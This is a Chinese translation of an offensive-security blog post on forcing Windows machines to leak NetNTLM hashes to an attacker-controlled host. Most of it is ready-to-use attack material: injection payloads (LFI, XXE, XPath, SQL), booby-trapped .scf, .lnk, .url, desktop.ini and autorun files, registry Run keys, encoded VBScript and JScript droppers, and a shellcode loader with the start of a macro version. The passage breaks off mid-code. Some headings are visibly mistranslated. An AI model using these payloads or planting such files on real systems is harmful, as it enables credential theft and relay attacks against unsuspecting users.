<html>
<head>
<title>Places of Interest in Stealing NetNTLM Hashes</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">窃取NetNTLM哈希的有趣地方</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/places-of-interest-in-stealing-netntlm-hashes-e9ac2cf17295?source=collection_archive---------1-----------------------#2017-03-24">https://infosecwriteups.com/places-of-interest-in-stealing-netntlm-hashes-e9ac2cf17295?source=collection_archive---------1-----------------------#2017-03-24</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="0ae9" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">有一天，我和@m3g9tr0n讨论了在窃取NetNTLM哈希时可以使用responder的不同地方。经过试验，我想到写这篇文章，以及在Windows世界中的一些很酷的发现。在这些情况下，SMBRelay攻击也是可能的。</p><h1 id="104f" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">LFI</h1><p id="5271" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">PHP中的<em class="lr"> include() </em>会为我们解析网络路径。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="8230" class="mb kp it lx b gy mc md l me mf"><a class="ae mg" href="http://host.tld/?page=//11.22.33.44/@OsandaMalith" rel="noopener ugc nofollow" target="_blank">http://host.tld/?page=//11.22.33.44/@OsandaMalith</a></span></pre><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/a606b1fc82e07f263563119e37d787b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*BtTuH8WhwuNHKbaR"/></div></figure><h1 id="de31" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">XXE</h1><p id="4cf1" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">在这里，我使用“<em class="lr">PHP://filter/convert . base64-encode/resource =</em>”来解析网络路径。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="7295" class="mb kp it lx b gy mc md l me mf">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br/>&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=//11.22.33.44/@OsandaMalith" &gt;<br/>]&gt;<br/>&lt;root&gt;<br/>  &lt;name&gt;&lt;/name&gt;<br/>  &lt;tel&gt;&lt;/tel&gt;<br/>  &lt;email&gt;OUT&amp;xxe;OUT&lt;/email&gt;<br/>  &lt;password&gt;&lt;/password&gt;<br/>&lt;/root&gt;</span></pre><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/89f32fba7ed5ffa104ccbc24f61020c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*nzptKPu9owshhMZp"/></div></figure><h1 id="fa62" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">XPath注入</h1><p id="0b9c" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">通常，doc()用于带外XPath注入，因此可以应用于解析网络路径。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="c0dc" class="mb kp it lx b gy mc md l me mf"><a class="ae mg" href="http://host.tld/?title=Foundation&amp;type=*&amp;rent_days=*" rel="noopener ugc nofollow" target="_blank">http://host.tld/?title=Foundation&amp;type=*&amp;rent_days=*</a> and doc('//35.164.153.224/@OsandaMalith')</span></pre><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/8fd2479ac48d172eb4a7bbb6d0f858f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*5q13XzoQ-4VleSK-"/></div></figure><h1 id="1c25" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">MySQL注入</h1><p id="12f2" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">我已经写了一篇关于MySQL带外注入的完整的<a class="ae mg" href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" rel="noopener ugc nofollow" target="_blank">帖子</a>，它可以通过互联网应用。您也可以使用“INTO OUTFILE”来解析网络路径。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="aa64" class="mb kp it lx b gy mc md l me mf"><a class="ae mg" href="http://host.tld/index.php?id=1'" rel="noopener ugc nofollow" target="_blank">http://host.tld/index.php?id=1'</a> union select 1,2,load_file('\\\\192.168.0.100\\@OsandaMalith'),4;%00</span></pre><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/3cde31ad9e8933b3dedebe17e8d72dc8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*R6jJkkzoRhdS5ZeP"/></div></figure><h1 id="5a3a" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">MSSQL</h1><p id="c541" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">由于支持堆栈查询，我们可以调用存储过程。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="eedf" class="mb kp it lx b gy mc md l me mf">';declare @q varchar(99);set @q='\\192.168.254.52\test'; exec master.dbo.xp_dirtree @q</span></pre><h1 id="19ac" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">Regsvr32</h1><p id="3214" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">在做实验的时候偶然发现了这个。sct文件。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="2b14" class="mb kp it lx b gy mc md l me mf">regsvr32 /s /u /i://35.164.153.224/@OsandaMalith scrobj.dll</span></pre><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/5d167504f84aea5cb1d56300d4a6c9d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*3nlq6rEm564ri-MP"/></div></figure><h1 id="15fb" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">一批</h1><p id="6a4c" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">你可以探索许多可能的方法</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="cef5" class="mb kp it lx b gy mc md l me mf">echo 1 &gt; //192.168.0.1/abc <br/>pushd \\192.168.0.1\abc <br/>cmd /k \\192.168.0.1\abc <br/>cmd /c \\192.168.0.1\abc <br/>start \\192.168.0.1\abc <br/>mkdir \\192.168.0.1\abc <br/>type\\192.168.0.1\abc <br/>dir\\192.168.0.1\abc <br/>find, findstr, [x]copy, move, replace, del, rename and many more!</span></pre><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/68490c076e8f1793f32c6ba25d81da44.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*aYTaFK1M6k4IgRJL"/></div></figure><p id="298f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这是我在里面找到的另一个</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="781b" class="mb kp it lx b gy mc md l me mf">regini -m //osanda malith</span></pre><figure class="ls lt lu lv gt mi"><div class="bz fp l di"><div class="ml mm l"/></div></figure><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mo mp di mq bf mr"><div class="gh gi mn"><img src="../Images/392ad5b0e1014514f27505b79308f7e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*YK_Ub19DiiLXofbU"/></div></div></figure><h1 id="63f5" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">自动完成</h1><p id="32cc" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">你只需要键入'<em class="lr"> \\host\ </em>'，自动完成将在浏览器和运行对话框下完成。</p><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/29bdccd4d9514f7712f215efe7724e5b.png" data-original-src="https://miro.medium.com/v2/resize:fit:762/0*kOPvxSEvAv3boKUC"/></div></figure><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/005b267519cc58e8ff0649e4b0109457.png" data-original-src="https://miro.medium.com/v2/resize:fit:810/0*w-73_tA0betBOVtX"/></div></figure><h1 id="7e64" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">Autorun.inf</h1><p id="bd4c" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">从Windows 7开始，此功能被禁用。但是，您可以通过更改自动运行的组策略来启用。确保隐藏Autorun.inf文件才能工作。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="b1ff" class="mb kp it lx b gy mc md l me mf">[autorun]<br/>open=\\35.164.153.224\setup.exe<br/>icon=something.ico<br/>action=open Setup.exe</span></pre><h1 id="c449" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">外壳命令文件</h1><p id="06bb" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">您可以将其保存为something.scf，打开文件夹资源管理器后，它会尝试解析图标的网络路径。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="8e4d" class="mb kp it lx b gy mc md l me mf">[Shell]<br/>Command=2<br/>IconFile=\\35.164.153.224\test.ico<br/>[Taskbar]<br/>Command=ToggleDesktop</span></pre><h1 id="498c" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">Desktop.ini</h1><p id="8653" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">desktop.ini文件包含应用于该文件夹的图标信息。我们可以滥用它来解析网络路径。一旦你打开文件夹，你应该得到散列。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="7270" class="mb kp it lx b gy mc md l me mf">mkdir openMe<br/>attrib +s openMe<br/>cd openMe<br/>echo [.ShellClassInfo] &gt; desktop.ini<br/>echo IconResource=\\192.168.0.1\aa &gt;&gt; desktop.ini<br/>attrib +s +h desktop.ini</span></pre><p id="3736" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在Windows XP系统中，desktop.ini文件使用“IcondFile”而不是“IconResource”。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="fae3" class="mb kp it lx b gy mc md l me mf">[.ShellClassInfo]<br/>IconFile=\\192.168.0.1\aa<br/>IconIndex=1337</span></pre><h1 id="f3ae" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">快捷方式文件(。lnk)</h1><p id="2dbb" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">我们可以创建一个包含网络路径的快捷方式，当您打开快捷方式时，Windows将尝试解析网络路径。您也可以指定一个键盘快捷键来触发该快捷键。对于图标，您可以给出Windows二进制文件的名称，或者从system32目录中的shell32.dll、Ieframe.dll、imageres.dll、pnidui.dll或wmploc.dll中选择一个图标。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="105d" class="mb kp it lx b gy mc md l me mf">Set shl = CreateObject("WScript.Shell") <br/>Set fso = CreateObject("Scripting.FileSystemObject") <br/>currentFolder = shl.CurrentDirectory <br/>Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, "\StealMyHashes.lnk")) <br/>sc.TargetPath = "\\35.164.153.224\@OsandaMalith" <br/>sc.WindowStyle = 1 <br/>sc.HotKey = "Ctrl+Alt+O" <br/>sc.IconLocation = "%windir%\system32\shell32.dll, 3" <br/>sc.Description = "I will Steal your Hashes" <br/>sc.Save</span></pre><p id="21ef" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">Powershell版本。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="f850" class="mb kp it lx b gy mc md l me mf">$objShell = New-Object -ComObject WScript.Shell <br/>$lnk = $objShell.CreateShortcut("StealMyHashes.lnk") $lnk.TargetPath = "\\35.164.153.224\@OsandaMalith" <br/>$lnk.WindowStyle = 1 <br/>$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" $lnk.Description = "I will Steal your Hashes" $lnk.HotKey = "Ctrl+Alt+O" <br/>$lnk.Save()</span></pre><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi mu"><img src="../Images/0ff4802c1f3fd71b53edc3051dd4b0c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:700/0*jdfMHvV8OcbbTWrA"/></div></figure><h1 id="aa99" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">互联网快捷方式(。网址)</h1><p id="e8bf" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">Windows中的另一个快捷方式是Internet快捷方式。您可以将其保存为something.url</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="f8c1" class="mb kp it lx b gy mc md l me mf">echo [InternetShortcut] &gt; stealMyHashes.url <br/>echo URL=file://192.168.0.1/@OsandaMalith &gt;&gt; stealMyHashes.url</span></pre><h1 id="71f5" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">使用注册表自动运行</h1><p id="94b9" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">您可以在以下任何路径中添加新的注册表项。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="d6b6" class="mb kp it lx b gy mc md l me mf">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span></pre><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/00a74565e68477fb9b9c23c7f145b8d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*AqzR2WxnokxaEpoV"/></div></figure><p id="fcf1" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">Powershell中可能有许多scriptlets可以解析网络路径。</p><h1 id="a411" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">Powershell</h1><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="fe0d" class="mb kp it lx b gy mc md l me mf">Invoke-Item \\192.168.0.1\aa <br/>Get-Content \\192.168.0.1\aa <br/>Start-Process \\192.168.0.1\aa</span></pre><h1 id="3182" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">工业管理学(Industrial Engineering)</h1><p id="4b22" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">IE将解析UNC路径。例如</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="6235" class="mb kp it lx b gy mc md l me mf">&lt;img src="\\\\192.168.0.1\\aa"&gt;</span></pre><p id="eeb1" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">你可以在XSS或者SQL注入的场景下注射。比如说。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="43f1" class="mb kp it lx b gy mc md l me mf"><a class="ae mg" href="http://host.tld/?id=-1'" rel="noopener ugc nofollow" target="_blank">http://host.tld/?id=-1'</a> union select 1,'&lt;img src="\\\\192.168.0.1\\aa"&gt;';%00</span></pre><h1 id="ddda" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">VBScript</h1><p id="e5b5" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">您可以将此另存为。vbs或可用于应用于Word或Excel文件的宏中。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="18d2" class="mb kp it lx b gy mc md l me mf">Set fso = CreateObject("Scripting.FileSystemObject") <br/>Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)</span></pre><p id="6778" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">你可以在网页上申请，但这只适用于IE。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="344d" class="mb kp it lx b gy mc md l me mf">&lt;html&gt;<br/>&lt;script type="text/Vbscript"&gt;<br/>&lt;!--<br/>Set fso = CreateObject("Scripting.FileSystemObject")<br/>Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)<br/>//--&gt;<br/>&lt;/script&gt;<br/>&lt;/html&gt;</span></pre><p id="483f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这是编码版本。你可以将它编码并保存为something.vbe</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="22ca" class="mb kp it lx b gy mc md l me mf">#@~^ZQAAAA==jY~6?}'ZM2mO2}4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#=?nO,sksn{0dWcGa+U:+XYsbVcJJzf*cF*cF*2 yczmCE~8#XSAAAA==^#~@</span></pre><p id="b369" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">你也可以在HTML文件中应用它。但只适用于IE。你可以将它保存为something.hta，这将是windows下的一个HTML应用程序，mshta.exe将执行它。默认情况下，它使用IE。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="11dc" class="mb kp it lx b gy mc md l me mf">&lt;html&gt;<br/>&lt;script type="text/Vbscript.Encode"&gt;<br/>&lt;!--<br/>#@~^ZQAAAA==jY~6?}'ZM2mO2}4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#=?nO,sksn{0dWcGa+U:+XYsbVcJJzf*cF*cF*2  yczmCE~8#XSAAAA==^#~@<br/>//--&gt;<br/>&lt;/script&gt;<br/>&lt;/html&gt;</span></pre><h1 id="65ee" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">JScript</h1><p id="5319" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">你可以在windows下把这个存成something.js。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="85f2" class="mb kp it lx b gy mc md l me mf">var fso = new ActiveXObject("Scripting.FileSystemObject")<br/>fso.FileExists("//192.168.0.103/aa")</span></pre><p id="359c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">你可以在HTML文件中应用同样的方法，但是只能在IE中使用。还有，可以把这个存成something.hta。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="f567" class="mb kp it lx b gy mc md l me mf">&lt;html&gt;<br/>&lt;script type="text/Jscript"&gt;<br/>&lt;!--<br/>var fso = new ActiveXObject("Scripting.FileSystemObject")<br/>fso.FileExists("//192.168.0.103/aa")<br/>//--&gt;<br/>&lt;/script&gt;<br/>&lt;/html&gt;</span></pre><p id="fd26" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这是编码版本。可以把这个存成something.jse。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="614b" class="mb kp it lx b gy mc md l me mf">#@~^XAAAAA==-mD~6/K'xh,)mDk-+or8%mYvE?1DkaOrxTRwks+jzkYn:}8LmOE*i0dGcsrV3XkdD/vJzJFO+R8v0RZRqT2zlmE#Ux4AAA==^#~@</span></pre><p id="37c1" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这个的HTML版本。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="ff46" class="mb kp it lx b gy mc md l me mf">&lt;html&gt;<br/>&lt;script type="text/Jscript.Encode"&gt;<br/>&lt;!--<br/>#@~^XAAAAA==-mD~6/K'xh,)mDk-+or8%mYvE?1DkaOrxTRwks+jzkYn:}8LmOE*i0dGcsrV3XkdD/vJzJFO+R8v0RZRqT2zlmE#Ux4AAA==^#~@<br/>//--&gt;<br/>&lt;/script&gt;<br/>&lt;/html&gt;</span></pre><h1 id="cfee" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">Windows脚本文件</h1><p id="58b4" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">将此另存为something.wsf。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="d6dc" class="mb kp it lx b gy mc md l me mf">&lt;package&gt;<br/>  &lt;job id="boom"&gt;<br/>    &lt;script language="VBScript"&gt;<br/>       Set fso = CreateObject("Scripting.FileSystemObject")<br/>       Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)<br/>    &lt;/script&gt;<br/>   &lt;/job&gt;<br/>&lt;/package&gt;</span></pre><h1 id="ed8d" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">外壳代码</h1><p id="78da" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">这是我做的一个小外壳代码。此外壳代码使用CreateFile并试图读取不存在的网络路径。您可以使用Responder之类的工具来捕获NetNTLM哈希。外壳代码可以被修改，以窃取互联网上的哈希。SMBRelay攻击也可以执行。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="7051" class="mb kp it lx b gy mc md l me mf">/*<br/>    Title: CreateFile Shellcode<br/>    Author: Osanda Malith Jayathissa (<a class="ae mg" href="http://twitter.com/OsandaMalith" rel="noopener ugc nofollow" target="_blank">@OsandaMalith</a>)<br/>    Website: <a class="ae mg" href="https://osandamalith.com" rel="noopener ugc nofollow" target="_blank">https://osandamalith.com</a><br/>    Size: 368 Bytes<br/>*/<br/># include &lt;stdlib.h&gt;<br/># include &lt;stdio.h&gt;<br/># include &lt;string.h&gt;<br/># include &lt;windows.h&gt;<br/>  <br/>int main() {<br/> <br/>  char *shellcode = <br/>  "\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x4c\x03\x02\x02\x81\xf1\x02\x02"<br/>  "\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x05\x0f\x44\xc6\xaa"<br/>  "\xe2\xf6\xe8\x05\x05\x05\x05\x5e\x8b\xfe\x81\xc6\x29\x01\x05\x05"<br/>  "\xb9\x02\x05\x05\x05\xfc\xad\x01\x3c\x07\xe2\xfa\x56\xb9\x8d\x10"<br/>  "\xb7\xf8\xe8\x5f\x05\x05\x05\x68\x31\x01\x05\x05\xff\xd0\xb9\xe0"<br/>  "\x53\x31\x4b\xe8\x4e\x05\x05\x05\xb9\xac\xd5\xaa\x88\x8b\xf0\xe8"<br/>  "\x42\x05\x05\x05\x6a\x05\x68\x80\x05\x05\x05\x6a\x03\x6a\x05\x6a"<br/>  "\x01\x68\x05\x05\x05\x80\x68\x3e\x01\x05\x05\xff\xd0\x6a\x05\xff"<br/>  "\xd6\x33\xc0\x5e\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c\x61\x0f\xbe"<br/>  "\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0\x75\xea\x8b"<br/>  "\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53\x56\x57\x89"<br/>  "\x4d\xf4\x64\xa1\x30\x05\x05\x05\x89\x45\xfc\x8b\x45\xfc\x8b\x40"<br/>  "\x0c\x8b\x40\x14\x89\x45\xec\x8b\xf8\x8b\xcf\xe8\xd2\xff\xff\xff"<br/>  "\x8b\x70\x18\x8b\x3f\x85\xf6\x74\x4f\x8b\x46\x3c\x8b\x5c\x30\x78"<br/>  "\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff\xff\xff\x8b"<br/>  "\x4c\x33\x20\x89\x45\xf8\x33\xc0\x03\xce\x89\x4d\xf0\x89\x45\xfc"<br/>  "\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75\xff\xff\xff"<br/>  "\x03\x45\xf8\x39\x45\xf4\x74\x1c\x8b\x45\xfc\x8b\x4d\xf0\x40\x89"<br/>  "\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c\x33\xc0\x5f"<br/>  "\x5e\x5b\xc9\xc3\x8b\x4d\xfc\x8b\x44\x33\x24\x8d\x04\x48\x0f\xb7"<br/>  "\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04\x30\x03\xc6\xeb\xdf"<br/>  "\x21\x05\x05\x05\x50\x05\x05\x05\x6b\x65\x72\x6e\x65\x6c\x33\x32"<br/>  "\x2e\x64\x6c\x6c\x05\x2f\x2f\x65\x72\x72\x6f\x72\x2f\x61\x61\x05";<br/>     <br/>  DWORD oldProtect;<br/>      <br/>    wprintf(L"Length : %d bytes\n@OsandaMalith", strlen(shellcode));<br/>    BOOL ret = VirtualProtect (shellcode, strlen(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br/>    <br/>    if (!ret) {<br/>        fprintf(stderr, "%s", "Error Occured");<br/>        return EXIT_FAILURE;<br/>    }<br/>    <br/>    ((void(*)(void))shellcode)();<br/>   <br/>    VirtualProtect (shellcode, strlen(shellcode), oldProtect, &amp;oldProtect);<br/>    <br/>    return EXIT_SUCCESS;<br/>}</span></pre><p id="b6a6" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><a class="ae mg" href="https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html" rel="noopener ugc nofollow" target="_blank">https://packets storm security . com/files/141707/create file-shellcode . html</a></p><figure class="ls lt lu lv gt mi gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/4e67c7d09f2bb8a7696e78589225d098.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*RbUuueCUosb7uyEy"/></div></figure><h1 id="2b98" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">宏内部的外壳代码</h1><p id="8fe8" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">下面是在Word/Excel宏中应用的上述外壳代码。您可以在VB6应用程序中使用相同的代码。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="b900" class="mb kp it lx b gy mc md l me mf">' Author : Osanda Malith Jayathissa (<a class="ae mg" href="http://twitter.com/OsandaMalith" rel="noopener ugc nofollow" target="_blank">@OsandaMalith</a>)<br/>' Title: Shellcode to request a non-existing network path<br/>' Website: <a class="ae mg" href="https://osandamalith" rel="noopener ugc nofollow" target="_blank">https://osandamalith</a><br/>' Shellcode : <a class="ae mg" href="https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html" rel="noopener ugc nofollow" target="_blank">https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html</a><br/>' This is a word/excel macro. This can be used in vb6 applications as well<br/> <br/>#If Vba7 Then<br/>    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _<br/>        ByVal lpThreadAttributes As Long, _<br/>        ByVal dwStackSize As Long, _ <br/>        ByVal lpStartAddress As LongPtr, _<br/>        lpParameter As Long, _<br/>        ByVal dwCreationFlags As Long, _ <br/>        lpThreadId As Long) As LongPtr<br/> <br/> <br/>    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _<br/>        ByVal lpAddress As Long, _<br/>        ByVal dwSize As Long, _<br/>        ByVal flAllocationType As Long, _<br/>        ByVal flProtect As Long) As LongPtr <br/> <br/>    Private Declare PtrSafe Function RtlMoveMemory Lib 